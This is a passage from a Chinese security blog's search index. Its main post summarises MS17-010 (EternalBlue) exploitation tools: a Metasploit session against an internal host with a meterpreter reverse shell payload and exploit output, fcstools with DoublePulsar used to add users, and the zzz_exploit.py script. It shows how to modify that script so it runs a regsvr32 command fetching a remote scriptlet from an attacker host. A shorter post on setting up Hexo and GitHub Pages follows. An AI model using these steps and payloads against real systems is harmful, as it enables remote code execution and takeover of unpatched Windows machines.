(exploit/windows/smb/ms17_010_eternalblue):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name           Current Setting  Required  Description</span><br><span class=\"line\">   ----           ---------------  --------  -----------</span><br><span class=\"line\">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class=\"string\">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class=\"line\">   RPORT          445              yes       The target port (TCP)</span><br><span class=\"line\">   SMBDomain      .                no        (Optional) The Windows domain to use <span class=\"keyword\">for</span> authentication</span><br><span class=\"line\">   SMBPass                         no        (Optional) The password <span class=\"keyword\">for</span> the specified username</span><br><span class=\"line\">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class=\"line\">   VERIFY_ARCH    <span class=\"literal\">true</span>             yes       Check <span class=\"keyword\">if</span> remote architecture matches exploit Target.</span><br><span class=\"line\">   VERIFY_TARGET  <span class=\"literal\">true</span>             yes       Check <span class=\"keyword\">if</span> remote OS matches exploit Target.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Payload options (windows/x64/meterpreter/reverse_https):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name      Current Setting  Required  Description</span><br><span class=\"line\">   ----      ---------------  --------  -----------</span><br><span class=\"line\">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class=\"string\">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class=\"line\">   LHOST     172.16.26.213    yes       The <span class=\"built_in\">local</span> listener hostname</span><br><span class=\"line\">   LPORT     8443             yes       The <span class=\"built_in\">local</span> listener port</span><br><span class=\"line\">   LURI                       no        The HTTP Path</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Exploit target:</span><br><span class=\"line\"></span><br><span class=\"line\">   Id  Name</span><br><span class=\"line\">   --  ----</span><br><span class=\"line\">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class=\"built_in\">set</span> rhosts 172.16.26.238</span><br><span class=\"line\">rhosts =&gt; 172.16.26.238</span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started HTTPS reverse handler on https://172.16.26.213:8443</span><br><span class=\"line\">[*] 172.16.26.238:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class=\"line\">[+] 172.16.26.238:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class=\"line\">[*] 172.16.26.238:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] 172.16.26.238:445 - Connecting to target <span class=\"keyword\">for</span> exploitation.</span><br><span class=\"line\">[+] 172.16.26.238:445 - Connection established <span class=\"keyword\">for</span> exploitation.</span><br><span class=\"line\">[+] 172.16.26.238:445 - Target OS selected valid <span class=\"keyword\">for</span> OS indicated by SMB reply</span><br><span class=\"line\">[*] 172.16.26.238:445 - CORE raw buffer dump (53 bytes)</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000030  61 63 6b 20 31                                   ack 1           </span><br><span class=\"line\">[+] 172.16.26.238:445 - Target arch selected valid <span class=\"keyword\">for</span> arch indicated by DCE/RPC reply</span><br><span class=\"line\">[*] 172.16.26.238:445 - Trying exploit with 12 Groom Allocations.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending all but last fragment of exploit packet</span><br><span class=\"line\">[*] 172.16.26.238:445 - Starting non-paged pool grooming</span><br><span class=\"line\">[+] 172.16.26.238:445 - Sending SMBv2 buffers</span><br><span class=\"line\">[+] 172.16.26.238:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending final SMBv2 buffers.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending last fragment of exploit packet!</span><br><span class=\"line\">[*] 172.16.26.238:445 - Receiving response from exploit packet</span><br><span class=\"line\">[+] 172.16.26.238:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending egg to corrupted connection.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Triggering free of corrupted buffer.</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></pre></td></tr></table></figure>\n\n<p>该工具的利用成功率并不高，对目标系统版本要求较高，需要为win7或者winserver2008 r2，但结合msf的meterpreter进行流量代理，先在内网中过一遍c段倒是挺好的。</p>\n<h1 id=\"0x02-fcstools\"><a href=\"#0x02-fcstools\" class=\"headerlink\" title=\"0x02  fcstools\"></a>0x02  fcstools</h1><p>适用于在内网中，服务器无法出外网或者反弹到shell的情况，能够直接执行命令，如在目标机器添加用户等。一般msf等工具都是直接反弹meterpreter，如果目标机在无法出外网或者反弹的情况就只能使用这个离线工具。</p>\n<p>该工具需要配合DLL生成工具进行，替换掉x86或者x64文件，fcstools就会执行相关的dll命令。</p>\n<p><img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818130214827.png\" alt=\"image-20200818130214827\"></p>\n<p>生成dll后，替换fcstools里面的x86或者x64文件，<strong>注意添加用户时，密码要满足系统的复杂度要求</strong>。</p>\n<p>.<img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818130320705.png\" alt=\"image-20200818130320705\"></p>\n<p>然后就可以运行工具进行攻击了，</p>\n<p><img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818130946475.png\" alt=\"image-20200818130946475\"></p>\n<p>eternalblue工具种下后门后，点击doublepulsar，利用后门执行dll里面的命令</p>\n<p><img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818131312293.png\" alt=\"image-20200818131312293\"></p>\n<h1 id=\"0x03-zzz-exploit-py\"><a href=\"#0x03-zzz-exploit-py\" class=\"headerlink\" title=\"0x03 zzz_exploit.py\"></a>0x03 zzz_exploit.py</h1><p>github地址：<a href=\"https://github.com/worawit/MS17-010\">https://github.com/worawit/MS17-010</a></p>\n<p>该脚本有几个关键点需要注意：</p>\n<ol>\n<li>需要有一个系统可登陆的smb账户，可通过爆破等方式获取</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">USERNAME = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">PASSWORD = <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><code>python zzz_exploit.py &lt;ip&gt; [pipe_name]</code>，需要有一个管道名。常见的管道名如下：</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER db2remotecmd </span><br></pre></td></tr></table></figure>\n\n<p>3、默认的脚本是在c盘创建一个pwn.txt文件，需要修改为cs或者msf生成的执行文件，就能反弹</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">smb_pwn</span>(<span class=\"params\">conn, arch</span>):</span></span><br><span class=\"line\">    smbConn = conn.get_smbconnection()</span><br><span class=\"line\">    </span><br><span class=\"line\">    print(<span class=\"string\">&#x27;creating file c:\\\\pwned.txt on the target&#x27;</span>)</span><br><span class=\"line\">    tid2 = smbConn.connectTree(<span class=\"string\">&#x27;C$&#x27;</span>)</span><br><span class=\"line\">    fid2 = smbConn.createFile(tid2, <span class=\"string\">&#x27;/pwned.txt&#x27;</span>)</span><br><span class=\"line\">    smbConn.closeFile(tid2, fid2)</span><br><span class=\"line\">    smbConn.disconnectTree(tid2)</span><br></pre></td></tr></table></figure>\n\n<p>可改为如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service_exec(conn, <span class=\"string\">r&#x27;cmd /c regsvr32 /s /n /u /i:http://192.168.2.164:8080/test.sct scrobj.dll&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>以上便是几个使用频率比较高的工具，还有诸如CS上面的插件，k8的扫描工具等，效果一般或者比较傻瓜化，故不再记录。</p>\n","categories":["Pentest"],"tags":["工具"]},{"title":"helloworld again","url":"http://blog.le31ei.top/2020/08/17/helloworld-again/","content":"<p>重新整理了下博客内容，删除了以前的文章，换了个简洁的主题。学习还是要养成输出的习惯，学完一块内容后，做个总结，回头看看自己过程也是很好的事情。</p>\n<p>本文记录一下github pages搭建的过程。</p>\n<h1 id=\"0x01-hexo安装\"><a href=\"#0x01-hexo安装\" class=\"headerlink\" title=\"0x01 hexo安装\"></a>0x01 hexo安装</h1><p>npm等环境安装不再详述。</p>\n<p>直接上命令：<code>npm install -g hexo</code></p>\n<p>初始化命令：<code>hexo init</code>，生成基本的结构</p>\n<p><img src=\"/2020/08/17/helloworld-again/image-20200817154147163.png\" alt=\"image-20200817154147163\"></p>\n<h1 id=\"0x02-github创建项目\"><a href=\"#0x02-github创建项目\" class=\"headerlink\" title=\"0x02 github创建项目\"></a>0x02 github创建项目</h1><p>创建<code>username.github.io</code>名称的项目即可，对应的github pages就是这个</p>\n<p>blog目录下设置git全局参数:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;name&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-主题及配置\"><a href=\"#0x03-主题及配置\" class=\"headerlink\" title=\"0x03 主题及配置\"></a>0x03 主题及配置</h1><p>修改<code>_config.yml</code>文件deploy，设置如下：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repo:</span> </span><br><span class=\"line\">    <span class=\"attr\">github:</span> <span class=\"string\">https://github.com/le31ei/le31ei.github.io.git</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n\n<p>选择的主题是<code>https://github.com/forsigner/fexo</code>，够简洁的主题</p>\n<p>替换的方法比较简单，参考文档<code>http://forsigner.com/2016/03/10/fexo-doc-zh-cn/</code></p>\n<p>这里记录下常用的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 升级</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> themes/fexo</span><br><span class=\"line\">$ git commit -am <span class=\"string\">&#x27;update&#x27;</span></span><br><span class=\"line\">$ git pull</span><br><span class=\"line\"><span class=\"comment\"># 启用</span></span><br><span class=\"line\"><span class=\"comment\"># 打开博客根目录的 _config.yml 设为 theme: fexo</span></span><br></pre></td></tr></table></figure>\n\n<p>主题的配置路径<code>themes/fexo/_config.yml</code>，具体配置参数可以参考文档自己做细微的调整。</p>\n<p>其他hexo常见命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建测试页面</span></span><br><span class=\"line\">hexo n <span class=\"string\">&quot;test&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 部署</span></span><br><span class=\"line\">hexo g -d</span><br><span class=\"line\"><span class=\"comment\"># 新建草稿</span></span><br><span class=\"line\">hexo new draft <span class=\"string\">&quot;new draft&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 草稿变成文章</span></span><br><span class=\"line\">hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"0x04-绑定自定义域名\"><a href=\"#0x04-绑定自定义域名\" class=\"headerlink\" title=\"0x04 绑定自定义域名\"></a>0x04 绑定自定义域名</h1><p>需要添加CNAME，将自己的域名填写到CNAME文件中，DNS解析选择CNAME解析。</p>\n<p><img src=\"/2020/08/17/helloworld-again/image-20200817155628007.png\" alt=\"image-20200817155628007\"></p>\n<p>以上就是博客搭建过程。搭建过程中也尝试了给博客提提速，github国内访问实在太慢，而且百度爬虫也会403。奈何尝试过CDN（需要备案放弃）、coding.net的pages、gitee pages，各种复杂配置，还是回到了最简单的方式，直接github访问省时省力。</p>\n","categories":["杂文"],"tags":["hexo"]},{"title":"about","url":"http://blog.le31ei.top/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://blog.le31ei.top/category/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://blog.le31ei.top/tag/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://blog.le31ei.top/search/index.html","content":"","categories":[],"tags":[]}]